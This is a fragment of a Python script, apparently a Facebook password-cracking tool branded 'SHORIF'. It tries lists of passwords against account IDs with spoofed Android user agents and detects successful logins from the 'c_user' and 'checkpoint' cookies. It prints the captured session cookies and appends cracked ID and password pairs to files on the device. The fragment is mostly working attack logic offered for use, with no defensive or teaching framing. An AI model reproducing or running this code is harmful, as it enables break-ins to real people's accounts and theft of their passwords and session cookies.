...
def ud():
    os.system('clear')
    jalan(logo)
    print(' \033[1;32m[1] Follow My Facebook')
    print(' [2] EXIT')
    opt = input('\n   CHOOSE OPTION >>>\033[1;37m ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/SHORIF.6T9?mibextid=ZbWKwL')
        FD()
        return None
...
for xd in range(10000):
    aa='Mozilla/5.5 (Linux; U; Android'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[SHORIF-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SHORIF-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[SHORIF-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SHORIF-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[SHORIF] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
